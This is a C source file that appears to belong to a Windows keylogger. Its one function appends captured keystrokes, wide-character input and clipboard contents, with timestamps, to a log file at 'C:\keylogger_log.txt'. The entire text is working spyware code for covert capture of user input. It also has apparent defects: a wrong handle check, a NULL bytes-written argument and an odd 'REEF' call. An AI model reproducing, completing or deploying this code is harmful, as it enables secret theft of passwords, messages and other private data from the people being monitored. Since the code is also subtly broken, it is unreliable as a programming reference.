#include "winkey.h"

VOID log(void *toLog, int MODE, BOOL putDate)
{
    HANDLE f = CreateFileA("C:\\keylogger_log.txt", FILE_APPEND_DATA, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    char buf[1024];
    
    if (f == NULL)
        return;
    if (putDate)
    {
        SYSTEMTIME lt;    
        GetLocalTime(&lt);
        sprintf_s(buf, (unsigned)_countof(buf), "\n[%02d/%02d/%d %02d:%02d:%02d]", lt.wDay, lt.wMonth, lt.wYear, lt.wHour, lt.wMinute, lt.wSecond);
        WriteFile(f, buf, (DWORD)strlen(buf), NULL, NULL);
    }
    if (MODE == CHAR_MODE)
        WriteFile(f, toLog, (DWORD)strlen((char *)toLog), NULL, NULL);
    else if (MODE == WCHAR_MODE || MODE == CLPB_MODE)
    {
        if (MODE == CLPB_MODE)  WriteFile(f, "[Clipboard]", 11, NULL, NULL);
        int len = WideCharToMultiByte(CP_UTF8, WC_NO_BEST_FIT_CHARS | WC_COMPOSITECHECK | WC_DEFAULTCHAR, (LPCWCH)toLog, -1, NULL, 0, NULL, NULL);
        if (len > 0)
        {
            char *toWrite = malloc(len + 1);
            if (toWrite == NULL)
                goto END;
            len = WideCharToMultiByte(CP_UTF8, WC_NO_BEST_FIT_CHARS | WC_COMPOSITECHECK | WC_DEFAULTCHAR, (LPCWCH)toLog, -1, toWrite, len + 1, NULL, NULL);
            if (len > 0)
                WriteFile(f, toWrite, (DWORD)strlen(toWrite), NULL, NULL);
            REEF(toWrite);
        }
    }
END:
    CloseHandle(f);
}